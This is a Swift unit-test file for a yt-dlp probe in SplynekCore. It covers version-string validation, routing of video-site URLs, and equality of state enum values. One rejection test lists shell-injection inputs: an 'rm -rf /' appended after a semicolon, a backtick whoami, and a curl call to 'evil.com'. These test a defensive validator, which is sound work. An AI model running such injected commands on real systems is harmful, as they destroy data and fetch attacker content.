import Foundation
@testable import SplynekCore

/// 2026-05-05 pre-flight tests for Strategy Bet S3 (yt-dlp swallow).
/// We don't actually invoke yt-dlp from CI (it might not be installed,
/// it phones home for cookies setup, etc.).  These tests cover the
/// pure-input surfaces:
///
///   - `isValidVersion` — defensive parsing of `--version` output
///   - `shouldRouteThroughYtDlp` — host-list match
///   - State enum equality
///
/// The actual `Process()` invocation + path probing is exercised at
/// runtime when the user opens Settings → Local AI assistant (and
/// eventually a dedicated yt-dlp pill).
enum YtDlpProbeTests {

    static func run() {
        TestHarness.suite("YtDlpProbe.isValidVersion — accepts real yt-dlp shapes") {

            TestHarness.test("Standard YYYY.MM.DD") {
                try expect(YtDlpProbe.isValidVersion("2024.12.13"))
                try expect(YtDlpProbe.isValidVersion("2025.10.07"))
                try expect(YtDlpProbe.isValidVersion("2021.01.01"))
            }

            TestHarness.test("Patched YYYY.MM.DD.NNN") {
                try expect(YtDlpProbe.isValidVersion("2024.12.13.123"))
                try expect(YtDlpProbe.isValidVersion("2025.06.15.4"))
            }

            TestHarness.test("Two-part fallback (rare)") {
                try expect(YtDlpProbe.isValidVersion("2020.09"))
            }
        }

        TestHarness.suite("YtDlpProbe.isValidVersion — rejects garbage / injection") {

            TestHarness.test("Empty + whitespace") {
                try expect(!YtDlpProbe.isValidVersion(""))
                try expect(!YtDlpProbe.isValidVersion(" "))
                try expect(!YtDlpProbe.isValidVersion("\n"))
            }

            TestHarness.test("Shell injection attempts") {
                try expect(!YtDlpProbe.isValidVersion("2024.12.13; rm -rf /"))
                try expect(!YtDlpProbe.isValidVersion("2024.12.13`whoami`"))
                try expect(!YtDlpProbe.isValidVersion("$(curl evil.com)"))
            }

            TestHarness.test("Letters mixed in") {
                try expect(!YtDlpProbe.isValidVersion("2024.12.dev"))
                try expect(!YtDlpProbe.isValidVersion("v1.2.3"))
                try expect(!YtDlpProbe.isValidVersion("yt-dlp 2024.12.13"))
            }

            TestHarness.test("Too many or too few parts") {
                try expect(!YtDlpProbe.isValidVersion("1"))
                try expect(!YtDlpProbe.isValidVersion("1.2.3.4.5"))
            }

            TestHarness.test("Component too long (likely garbage)") {
                try expect(!YtDlpProbe.isValidVersion("12345.12.13"))
            }

            TestHarness.test("Negative / weird characters") {
                try expect(!YtDlpProbe.isValidVersion("-2024.12.13"))
                try expect(!YtDlpProbe.isValidVersion("2024..12.13"))
                try expect(!YtDlpProbe.isValidVersion(".2024.12.13"))
            }
        }

        TestHarness.suite("YtDlpProbe.shouldRouteThroughYtDlp — host matching") {

            TestHarness.test("Known video sites match") {
                let yes = [
                    "https://www.youtube.com/watch?v=abc",
                    "https://youtu.be/abc",
                    "https://www.twitch.tv/some-vod",
                    "https://www.instagram.com/p/abc/",
                    "https://www.tiktok.com/@user/video/123",
                    "https://x.com/user/status/123",
                    "https://vimeo.com/123",
                ].compactMap(URL.init(string:))
                for u in yes {
                    try expect(YtDlpProbe.shouldRouteThroughYtDlp(u),
                               "Should route: \(u.absoluteString)")
                }
            }

            TestHarness.test("Direct-HTTP file URLs do NOT route") {
                let no = [
                    "https://releases.ubuntu.com/24.04/ubuntu-24.04.iso",
                    "https://example.com/file.zip",
                    "https://github.com/foo/bar/releases/download/v1/file.dmg",
                ].compactMap(URL.init(string:))
                for u in no {
                    try expect(!YtDlpProbe.shouldRouteThroughYtDlp(u),
                               "Should NOT route: \(u.absoluteString)")
                }
            }

            TestHarness.test("Subdomain variants are not blanket-matched") {
                // `m.youtube.com` (mobile) is intentionally not in the
                // preferred-hosts list — yt-dlp normalizes it server-side
                // but we want explicit opt-in for hosts we've curated.
                // If someone reports a missing variant, add it explicitly.
                let mobile = URL(string: "https://m.youtube.com/watch?v=abc")!
                try expect(!YtDlpProbe.shouldRouteThroughYtDlp(mobile))
            }
        }

        TestHarness.suite("YtDlpProbe.State — enum equality") {

            TestHarness.test("Distinct cases are not equal") {
                try expect(YtDlpProbe.State.notInstalled != .sandboxBlocked)
                try expect(YtDlpProbe.State.installed(version: "2024.12.13", path: "/x")
                           != .notInstalled)
            }

            TestHarness.test("Same payload installed states are equal") {
                let a = YtDlpProbe.State.installed(version: "2024.12.13", path: "/x")
                let b = YtDlpProbe.State.installed(version: "2024.12.13", path: "/x")
                try expect(a == b)
            }

            TestHarness.test("Different payloads are not equal") {
                let a = YtDlpProbe.State.installed(version: "2024.12.13", path: "/x")
                let b = YtDlpProbe.State.installed(version: "2025.01.01", path: "/x")
                try expect(a != b)
            }
        }
    }
}
